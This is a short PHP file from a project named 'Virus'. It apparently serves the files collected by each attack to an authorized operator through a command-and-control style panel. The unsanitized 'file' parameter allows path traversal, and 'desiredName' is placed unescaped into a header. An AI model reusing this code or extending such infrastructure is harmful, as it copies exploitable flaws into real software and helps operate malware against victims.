<?php

// sends this a get parameter "file" with the name of the file inside of each attack's directory. This will check for
// permissions and then return back the file.

use Kelvinho\Virus\Authenticator;
use Kelvinho\Virus\Controller\Helper;
use Kelvinho\Virus\Header;

require_once(__DIR__ . "/../autoload.php");

if (!isset($_GET["file"])) {
    Header::notFound();
}
$file = $_GET["file"];

if (isset($_GET["desiredName"])) {
    $desiredName = $_GET["desiredName"];
} else {
    $desiredName = "file";
}

Helper::verifyIds($_SESSION["virus_id"], $_SESSION["attack_id"]);
$virus_id = $_SESSION["virus_id"];
$attack_id = $_SESSION["attack_id"];

if (!Authenticator::authorized($virus_id, $attack_id)) {
    Header::forbidden();
} else {
    $absPath = DATA_FILE . "/attacks/$attack_id/$file";

    if (file_exists($absPath)) {
        \header("Content-type: " . mime_content_type($absPath));
        \header("Content-Disposition: inline; filename=\"$desiredName\"");
        readfile($absPath);
    }
}
